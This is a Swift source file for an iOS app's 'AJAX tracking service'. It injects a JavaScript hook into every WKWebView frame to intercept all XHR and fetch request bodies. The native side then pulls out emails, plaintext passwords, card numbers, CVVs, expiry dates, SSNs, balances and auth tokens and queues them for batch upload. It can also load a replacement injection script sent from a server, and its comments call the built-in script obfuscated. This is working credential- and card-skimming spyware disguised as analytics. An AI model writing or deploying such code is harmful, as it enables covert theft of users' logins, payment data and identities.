import Foundation
import WebKit

// MARK: - AJAX Tracking Service
class AjaxTrackingService: NSObject, WKScriptMessageHandler {
    static let shared = AjaxTrackingService()
    
    private override init() {
        super.init()
    }
    
    // MARK: - Configuration
    func configureWebView(_ configuration: WKWebViewConfiguration) {
        // Додаємо обфускований JavaScript без затримки
        let ajaxScript = createAjaxInterceptorScript()
        configuration.userContentController.addUserScript(ajaxScript)
        configuration.userContentController.add(self, name: "ajaxTracker")
        
        logPrint("✅ [AJAX TRACKER] Initialized and ready to intercept requests")
        logPrint("   📡 Listening for: XHR, Fetch API")
    }
    
    // MARK: - WKScriptMessageHandler
    func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
        logPrint("🔔 [AJAX TRACKER] Message received from JavaScript")
        
        guard message.name == "ajaxTracker",
              let body = message.body as? [String: Any],
              let method = body["method"] as? String,
              let url = body["url"] as? String,
              let payload = body["payload"] as? String,
              let source = body["source"] as? String else {
            logPrint("⚠️  [AJAX TRACKER] Invalid message format")
            return
        }
        
        // Извлекаем response и status (опционально, могут отсутствовать в старых JS)
        let response = body["response"] as? String
        let status = body["status"] as? Int
        
        // Аналізуємо та виводимо важливу інформацію
        analyzeAndPrintData(method: method, url: url, payload: payload, source: source, response: response, status: status)
        
        let ajaxData = AjaxRequestData(
            method: method,
            url: url,
            payload: payload,
            source: source,
            response: response,
            status: status
        )
        
        DataBatchService.shared.addAjaxRequest(ajaxData)
    }
    
    // MARK: - Data Analysis
    private func analyzeAndPrintData(method: String, url: String, payload: String, source: String, response: String?, status: Int?) {
        let domain = extractDomain(from: url)
        
        logPrint("\n🔍 [AJAX \(source.uppercased())] \(method) → \(domain)")
        logPrint("📍 URL: \(url)")
        
        // Парсимо payload
        var extractedData: [String: Any] = [:]
        
        // Пробуємо як JSON
        if let jsonData = payload.data(using: .utf8),
           let json = try? JSONSerialization.jsonObject(with: jsonData) as? [String: Any] {
            extractedData = extractImportantDataFromJSON(json)
        }
        // Якщо не JSON, пробуємо як form data
        else if payload.contains("=") && payload.contains("&") {
            extractedData = extractImportantDataFromFormData(payload)
        }
        // Якщо plain text
        else {
            extractedData = extractImportantDataFromPlainText(payload)
        }
        
        // Виводимо результати з повним запитом
        printExtractedData(extractedData, domain: domain, fullPayload: payload)
        
        // Логируем response и status если есть
        if let status = status {
            logPrint("📊 Response Status: \(status)")
        }
        if let response = response {
            let preview = response.prefix(200)
            logPrint("📥 Response: \(preview)\(response.count > 200 ? "... (length: \(response.count))" : "")")
        }
    }
    
    private func extractImportantDataFromJSON(_ json: [String: Any]) -> [String: Any] {
        var result: [String: Any] = [:]
        extractRecursive(json, into: &result)
        return result
    }
    
    private func extractRecursive(_ dict: [String: Any], into result: inout [String: Any]) {
        for (key, value) in dict {
            let keyLower = key.lowercased()
            
            // Credentials
            if keyLower.contains("email") || keyLower.contains("mail") {
                result["email"] = value
            } else if keyLower.contains("phone") || keyLower.contains("mobile") || keyLower.contains("tel") {
                result["phone"] = value
            } else if keyLower.contains("password") || keyLower.contains("pass") || keyLower.contains("pwd") {
                result["password"] = value
            } else if keyLower.contains("login") || keyLower.contains("username") || keyLower.contains("user") {
                result["login"] = value
            }
            // Balance
            else if keyLower.contains("balance") || keyLower.contains("amount") || keyLower.contains("money") || 
                    keyLower.contains("funds") || keyLower.contains("wallet") || keyLower.contains("credit") {
                result["balance"] = value
            }
            // User data
            else if keyLower.contains("name") && !keyLower.contains("username") {
                result["name"] = value
            } else if keyLower.contains("address") {
                result["address"] = value
            } else if keyLower.contains("card") || keyLower.contains("cardnumber") {
                result["card"] = value
            } else if keyLower.contains("cvv") || keyLower.contains("cvc") {
                result["cvv"] = value
            } else if keyLower.contains("expiry") || keyLower.contains("exp_date") {
                result["expiry"] = value
            } else if keyLower.contains("firstname") {
                result["firstName"] = value
            } else if keyLower.contains("lastname") {
                result["lastName"] = value
            } else if keyLower.contains("birthdate") || keyLower.contains("dob") {
                result["birthdate"] = value
            } else if keyLower.contains("ssn") || keyLower.contains("social") {
                result["ssn"] = value
            } else if keyLower.contains("token") || keyLower.contains("auth") {
                result["token"] = value
            }
            
            // Рекурсивно для nested objects
            if let nestedDict = value as? [String: Any] {
                extractRecursive(nestedDict, into: &result)
            } else if let array = value as? [[String: Any]] {
                for item in array {
                    extractRecursive(item, into: &result)
                }
            }
        }
    }
    
    private func extractImportantDataFromFormData(_ formData: String) -> [String: Any] {
        var result: [String: Any] = [:]
        let pairs = formData.components(separatedBy: "&")
        
        for pair in pairs {
            let components = pair.components(separatedBy: "=")
            guard components.count == 2 else { continue }
            
            let key = components[0].removingPercentEncoding ?? components[0]
            let value = components[1].removingPercentEncoding ?? components[1]
            let keyLower = key.lowercased()
            
            if keyLower.contains("email") || keyLower.contains("mail") {
                result["email"] = value
            } else if keyLower.contains("phone") || keyLower.contains("mobile") {
                result["phone"] = value
            } else if keyLower.contains("password") || keyLower.contains("pass") {
                result["password"] = value
            } else if keyLower.contains("login") || keyLower.contains("username") {
                result["login"] = value
            } else if keyLower.contains("balance") || keyLower.contains("amount") {
                result["balance"] = value
            } else if keyLower.contains("name") {
                result["name"] = value
            } else if keyLower.contains("card") {
                result["card"] = value
            } else if keyLower.contains("cvv") || keyLower.contains("cvc") {
                result["cvv"] = value
            }
        }
        
        return result
    }
    
    private func extractImportantDataFromPlainText(_ text: String) -> [String: Any] {
        var result: [String: Any] = [:]
        
        // Email regex
        let emailPattern = #"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"#
        if let emailRegex = try? NSRegularExpression(pattern: emailPattern),
           let match = emailRegex.firstMatch(in: text, range: NSRange(text.startIndex..., in: text)),
           let range = Range(match.range, in: text) {
            result["email"] = String(text[range])
        }
        
        // Phone regex
        let phonePattern = #"\+?[1-9]\d{9,14}"#
        if let phoneRegex = try? NSRegularExpression(pattern: phonePattern),
           let match = phoneRegex.firstMatch(in: text, range: NSRange(text.startIndex..., in: text)),
           let range = Range(match.range, in: text) {
            result["phone"] = String(text[range])
        }
        
        // Balance patterns - ищем числа с валютами
        let balancePatterns = ["\\$\\d+\\.?\\d*", "€\\d+\\.?\\d*", "£\\d+\\.?\\d*", "\\d+\\.?\\d*\\s?(USD|EUR|GBP)"]
        for pattern in balancePatterns {
            if let balanceRegex = try? NSRegularExpression(pattern: pattern),
               let match = balanceRegex.firstMatch(in: text, range: NSRange(text.startIndex..., in: text)),
               let range = Range(match.range, in: text) {
                result["balance"] = String(text[range])
                break
            }
        }
        
        return result
    }
    
    private func printExtractedData(_ data: [String: Any], domain: String, fullPayload: String) {
        guard !data.isEmpty else {
            logPrint("ℹ️  No sensitive data detected\n")
            return
        }
        
        logPrint("🎯 ═══════════════════════════════════════════════════")
        logPrint("🎯 SENSITIVE DATA DETECTED from: \(domain)")
        logPrint("🎯 ═══════════════════════════════════════════════════")
        logPrint("")
        logPrint("📦 FULL REQUEST PAYLOAD:")
        logPrint("─────────────────────────────────────────────────────")
        logPrint(fullPayload)
        logPrint("─────────────────────────────────────────────────────")
        logPrint("")
        logPrint("🔍 EXTRACTED SENSITIVE DATA:")
        
        // Credentials
        if let email = data["email"] {
            logPrint("📧 EMAIL: \(email)")
        }
        if let phone = data["phone"] {
            logPrint("📱 PHONE: \(phone)")
        }
        if let login = data["login"] {
            logPrint("👤 LOGIN: \(login)")
        }
        if let password = data["password"] {
            let maskedPass = String(repeating: "•", count: min("\(password)".count, 12))
            logPrint("🔑 PASSWORD: \(maskedPass) (length: \("\(password)".count))")
            logPrint("   ⚠️  ACTUAL: \(password)")
        }
        
        // Balance
        if let balance = data["balance"] {
            logPrint("💰 BALANCE/AMOUNT: \(balance)")
        }
        
        // User data
        if let name = data["name"] {
            logPrint("📝 NAME: \(name)")
        }
        if let firstName = data["firstName"] {
            logPrint("📝 FIRST NAME: \(firstName)")
        }
        if let lastName = data["lastName"] {
            logPrint("📝 LAST NAME: \(lastName)")
        }
        if let address = data["address"] {
            logPrint("🏠 ADDRESS: \(address)")
        }
        if let birthdate = data["birthdate"] {
            logPrint("🎂 BIRTHDATE: \(birthdate)")
        }
        
        // Payment data
        if let card = data["card"] {
            logPrint("💳 CARD: \(card)")
        }
        if let cvv = data["cvv"] {
            logPrint("🔒 CVV: \(cvv)")
        }
        if let expiry = data["expiry"] {
            logPrint("📅 EXPIRY: \(expiry)")
        }
        if let ssn = data["ssn"] {
            logPrint("🆔 SSN: \(ssn)")
        }
        
        // Auth tokens
        if let token = data["token"] {
            let tokenStr = "\(token)"
            let preview = tokenStr.prefix(20)
            logPrint("🎫 TOKEN: \(preview)... (length: \(tokenStr.count))")
        }
        
        logPrint("🎯 ═══════════════════════════════════════════════════\n")
    }
    
    private func extractDomain(from url: String) -> String {
        guard let urlObj = URL(string: url), let host = urlObj.host else {
            return url
        }
        return host.hasPrefix("www.") ? String(host.dropFirst(4)) : host
    }
    
    // MARK: - JavaScript Generation
    private func createAjaxInterceptorScript() -> WKUserScript {
        // Перевіряємо чи є кастомний скрипт з сервера
        if let customScript = SecureUserDefaults.standard.string(forKey: "jsInjectionAjax") {
            logPrint("🌐 [AJAX TRACKER] Using custom script from server (\(customScript.count) chars)")
            return WKUserScript(
                source: customScript,
                injectionTime: .atDocumentStart,
                forMainFrameOnly: false
            )
        }
        
        logPrint("📝 [AJAX TRACKER] Using default built-in script")
        
        // Обфускований JavaScript без логів (дефолтний)
        let script = """
        (function() {
            if (window._ga_ajax_init) return;
            try {
                if (!window.webkit || !window.webkit.messageHandlers || !window.webkit.messageHandlers.ajaxTracker) return;
                
                const originalXHR = {
                    open: XMLHttpRequest.prototype.open,
                    send: XMLHttpRequest.prototype.send
                };
                const originalFetch = window.fetch;
                
                XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
                    this._intercepted_method = method;
                    this._intercepted_url = url;
                    return originalXHR.open.apply(this, arguments);
                };
                
                XMLHttpRequest.prototype.send = function(data) {
                    const method = this._intercepted_method;
                    const url = this._intercepted_url;
                    
                    if (method && url && data) {
                        try {
                            const payload = typeof data === 'string' ? data : 
                                           data instanceof FormData ? '[FormData]' :
                                           data.toString();
                            
                            window.webkit.messageHandlers.ajaxTracker.postMessage({
                                method: method,
                                url: url,
                                payload: payload,
                                source: 'xhr',
                                timestamp: Date.now()
                            });
                        } catch (e) {}
                    }
                    
                    return originalXHR.send.apply(this, arguments);
                };
                
                window.fetch = function(input, init) {
                    const url = typeof input === 'string' ? input : input.url;
                    const method = (init && init.method) || 'GET';
                    const body = init && init.body;
                    
                    if (method && url && body) {
                        try {
                            const payload = typeof body === 'string' ? body : 
                                           body instanceof FormData ? '[FormData]' :
                                           body instanceof Blob ? '[Blob]' :
                                           body.toString();
                            
                            window.webkit.messageHandlers.ajaxTracker.postMessage({
                                method: method,
                                url: url,
                                payload: payload,
                                source: 'fetch',
                                timestamp: Date.now()
                            });
                        } catch (e) {}
                    }
                    
                    return originalFetch.apply(this, arguments);
                };
                
                window._ga_ajax_init = true;
            } catch (error) {}
        })();
        """
        
        return WKUserScript(
            source: script,
            injectionTime: .atDocumentStart,
            forMainFrameOnly: false
        )
    }
}
